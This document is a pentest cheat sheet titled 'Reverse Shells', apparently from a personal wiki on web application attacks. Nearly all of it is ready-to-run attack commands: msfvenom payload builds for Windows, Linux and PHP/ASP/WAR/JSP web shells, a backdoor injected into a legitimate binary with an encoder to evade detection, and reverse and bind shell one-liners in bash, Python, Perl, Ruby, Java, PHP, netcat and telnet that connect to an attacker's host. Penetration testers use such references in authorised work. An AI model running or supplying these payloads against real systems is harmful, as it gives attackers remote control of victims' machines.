<!-- TITLE: 03 - Reverse Shells -->
<!-- SUBTITLE: Web Application Attacks -->

Reverse Shells

# Tips & Tricks

## Interactive Shell

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Character Echos

If there are experiancing your commands echoing back, this trick will fix up your shell

```text
<ctrl+z>
stty raw -echo
fg
reset
```

## Environment Variables

```text
export SHELL=/bin/bash
export HOME=/home/targetuser
export TERM=xterm-color
```

## Terminal Sizing

```text
stty -a
stty rows 28 cols 106
```

# Msfvenom / Meterpreter

There is an important difference between non-staged and staged payload. A **non-staged** shell is sent over in one block. You just send shell in one stage. This can be caught with metasploit multi-handler. But also with netcat.

**staged** shells send them in turn. This can be useful for when you have very small buffer for your shellcode, so you need to divide up the payload. Meterpreter is a staged shell. First it sends some parts of it and sets up the connection, and then it sends some more. This can be caught with metasploit multi-handler but not with netcat.

## Windows

### Meterpreter

**Standard meterpreter**

```text
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -o shell_reverse.exe
```

```text
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
```

**Meterpreter HTTPS**

It makes the meterpreter-traffic look normal. Since it is hidden in https the communication is encrypted and can be used to bypass deep-packet inspections.

```text
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.101 LPORT=443 -f exe -o met_https_reverse.exe
```

### Non-staged payload

```text
msfvenom -p windows/shell_reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o shell_reverse_tcp.exe
```

```text
use exploit/multi/handler
set payload windows/shell_reverse_tcp
```

### Staged payload

```text
msfvenom -p windows/shell/reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o staged_reverse_tcp.exe
```

This must be caught with metasploit. It does not work with netcat.

```text
use exploit/multi/handler
set payload windows/shell/reverse_tcp
```

### Inject payload into binary

```text
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -e x86/shikata_ga_nai -i 9 -x "/somebinary.exe" -o bad_binary.exe
```

## Linux

### Binary

```text
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f elf > shell.elf
```

# Other Methods

## Bash

```text
0<&196;exec 196<>/dev/tcp/192.168.1.101/80; sh <&196 >&196 2>&196
```

```text
bash -i >& /dev/tcp/10.0.0.130/8080 0>&1
```

## PHP

```php
php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Netcat

### Bind shell

```text
Linux
nc -vlp 5555 -e /bin/bash
nc 192.168.1.101 5555

Windows
nc.exe -nlvp 4444 -e cmd.exe
```

### Reverse shell

```text
Setup listener
nc -lvp 5555

Send back shells

>> Example 1
nc 192.168.1.101 5555 -e /bin/bash

>> Example 2
/bin/sh | nc 10.10.10.130 8888
```

### Without -e flag

```text
>> Example 1
rm -f /tmp/p; mknod /tmp/p p && nc 10.10.10.130 443 0/tmp/p

>> Example 2
mknod /tmp/p p && /bin/sh 0</tmp/p | nc 10.10.10.130 443 1>/tmp/p
```

Upgrade Netcat shell to an interactive:

\[1\] [https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

## Ncat

Ncat is a better and more modern version of netcat. One feature it has that netcat does not have is encryption. If you are on a pentest job you might not want to communicate unencrypted.

Bind

```text
ncat --exec cmd.exe --allow 192.168.1.101 -vnl 5555 --ssl
ncat -v 192.168.1.103 5555 --ssl
```

## Telnet

```text
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
```

```text
telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
```

## Perl

```perl
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

# Reverse Web Shells

## PHP

This php-shell is OS-independent. You can use it on both Linux and Windows.

```text
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.php
```

## ASP

```text
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f asp > shell.asp
```

## WAR

```text
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war > shell.war
```

## JSP

```text
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.jsp
```
